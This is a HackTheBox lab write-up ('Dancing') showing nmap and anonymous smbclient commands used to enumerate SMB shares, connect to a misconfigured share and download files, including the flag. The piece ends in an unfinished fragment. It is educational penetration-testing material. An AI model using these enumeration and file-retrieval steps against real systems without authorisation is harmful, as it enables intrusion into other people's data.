# HackTheBox Lab: Dancing

_Prepared by: 0ne-nine9_

---

## Introduction

This lab explores file transfer and enumeration using the SMB (Server Message Block) protocol, commonly found on Windows machines. The goal is to enumerate shares, exploit misconfigurations, and retrieve flags.

## Recon & Enumeration

### VPN Connection

- Ensure VPN is connected and target IP is accessible.

### Nmap Scan

```bash
nmap -A -p- <Target-IP>
```

- Key findings:
  - Port 445 (SMB) open
  - Port 139 (NetBIOS) open
  - Service versions detected

---

## SMB Enumeration

### Listing Shares

```bash
smbclient -L //<Target-IP> -N
```

- Shares found:
  - `ADMIN$` (administrative)
  - `C$` (system drive)
  - `IPC$` (inter-process communication)
  - `WorkShares` (custom share)

### Connecting to Shares

Attempt to connect to each share with blank password (guest/anonymous):

```bash
smbclient //<Target-IP>/ADMIN$ -N      # Access denied
smbclient //<Target-IP>/C$ -N          # Access denied
smbclient //<Target-IP>/WorkShares -N  # Success
```

### Navigating & Downloading Files

Once inside `WorkShares`:

```bash
ls           # List directories
cd Amy.J     # Enter Amy.J directory
get worknotes.txt   # Download worknotes.txt
cd ..
cd James.P   # Enter James.P directory
get flag.txt # Download flag.txt
exit         # Quit smbclient shell
```

---

## Foothold & Exploitation

- Exploited misconfigured SMB share (`WorkShares`) allowing anonymous access.
- Retrieved `worknotes.txt` (contains hints for further exploitation).
- Retrieved `flag.txt` (contains the lab flag).

---

## Flags & Proof

- **User Flag:** Found in `James.P/flag.txt`
- **Other Files:** `Amy.J/worknotes.txt` (may contain hints)

---

## Post-Exploitation

- Read and analyze exfiltrated files.
- `worknotes.txt` may suggest next steps or services to target in a real engagement.
- `flag.txt` is submitted to complete the lab.

---

## Lessons Learned

- Always enumerate all shares, including custom ones.
- Misconfigured permissions can allow unauthorized access.
- Use `smbclient` for interactive SMB enumeration and file transfer.
- Administrative shares (`ADMIN$`, `C$`) are usually protected.
- `Customshares` are more likely to be misconfigured.

---

## Extra Notes

- Use `smbclient -h` for help and command options.
- Files downloaded are saved in the current working directory.
- Always check for hints in non-flag files.

---

## References

- [HTB Academy: Introduction to Networking](https://academy.hackthebox.com/module/details/5)
- [SMB Protocol - Wikipedia](https://en.wikipedia.org/wiki/Server_Message_Block)

1. Using smbclient (interactive FTP-like tool)
   Syntax:
